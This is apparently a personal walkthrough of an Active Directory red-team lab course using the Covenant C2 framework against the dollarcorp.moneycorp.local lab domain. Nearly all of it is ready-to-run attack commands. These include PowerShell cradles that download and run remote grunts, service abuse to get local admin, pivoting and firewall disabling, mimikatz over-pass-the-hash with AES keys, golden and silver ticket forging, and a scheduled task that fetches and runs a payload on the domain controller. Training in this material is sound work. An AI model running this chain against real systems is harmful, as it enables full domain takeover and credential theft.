In this write up i will skip all the part that are unnecessary because this is the second run for me

Configure Covenant and download the Grunt on the student vm
```powershell
powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/pslauncher.ps1')"
```

Before running any command on the new Grunts we need to run the built-in task BypassAmsi always to avoid .NET AMSI Triggers.

### **Learning Objetive 1**
Use the built-in task of PowerView *PowerShellImport* to import PowerView.ps1

Once you done this you can go on the interact tab to launch the powerview command
```powerview
PowerShell Get-DomainUser
```
![[Pasted image 20231116172507.png]]


### **Learning Objetive 5 - exploit to student admin - First Lateral Movement**
Import powerup.ps1
and run the following command
```powerup
PowerShell Get-ServiceUnquoted
```
![[Pasted image 20231116173021.png]]
and
```powerup
PowerShell Get-ModifiableService
```
![[Pasted image 20231116173115.png]]
exploit it by installing a new grunt as local admin
```powerup
PowerShell Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command 'cmd.exe /c powershell.exe -Command "IEX (iwr "http://172.16.99.115/bruno.ps1" -UseBasicParsing)"'
```
![[Pasted image 20231116173400.png]]


Now look for derivate local admin by importing the Find-PSRemotingLocalAdminAccess.ps1 powerShell script and launch it
```interact
PowerShell Find-PSRemotingLocalAdminAccess
```
![[Pasted image 20231220121846.png]]

Tehere is a firewall between our kali and other machine, so we will use StudentVM as pivot
On StudentVM
```
ShellCmd netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=172.16.99.115
```
To check for Local Firewall
```
PowerShell Get-NetFirewallProfile
```
To disable local firewall
```
PowerShell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
Setup a new listener to link to the studentvm tunnel just created
![[Pasted image 20231220122530.png]]
And create a related launcher and launch it on the victim


### **Learning Objective 7 - Derivate Local Admins**
Import powerview and use it on dcorp-ci
```
PowerShell Find-DomainUserLocation
```
![[Pasted image 20231220152313.png]]
Now we can launch a download and execution command on the dcorm-mgmt machine from dcorp-ci to open a new grunt
```
PowerShell Invoke-Command -ScriptBlock {PowerShell -Sta -Nop -Window Hidden -Command "IEX (iwr 'http://172.16.100.115/StudentVMGrunt.ps1' -UseBasicParsing)"} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```
Now we can run mimikatz do dump all the hashes
![[Pasted image 20231220152858.png]]
Since now we have the svcadmin (Domain admin) creds we can use mimikatz to use the Over-Pass the Hash attack
Create a new binary launcher on studentListener
![[Pasted image 20231220153823.png]]
Host it
To perform the attack select the task mimikatz and launch the command (You need to have the file on the pwned machine). aes256 not rc4
```
"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:C:\Users\Public\Downloads\BinaryStudent.exe"
```
![[Pasted image 20231220155219.png]]
New grunt inside the launcher pwned machine will appear that has the svcadmin token inside
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
```
![[Pasted image 20231220155527.png]]

### **Learning Objective 8 - Create a Golden Ticket **

With Invoke-Mimikatz forge a golden ticket using the krbtgt hash
```
PowerShell Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
Use it

Create a silver ticket to HOST service to create a schedule task that open a new grunt
```
PowerShell Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /user:Administrator /ptt"'
```
![[Pasted image 20231221104317.png]]
The task will launch the Binary launcher already created
```
ShellCmd schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User115" /TR "powershell.exe -c 'iwr -UseBasicParsing http://172.16.100.115/StudentVMGrunt.exe -OutFile C:\Users\Public\StudentVMGrunt.exe; Start-Process C:\Users\Public\StudentVMGrunt.exe;'"
```
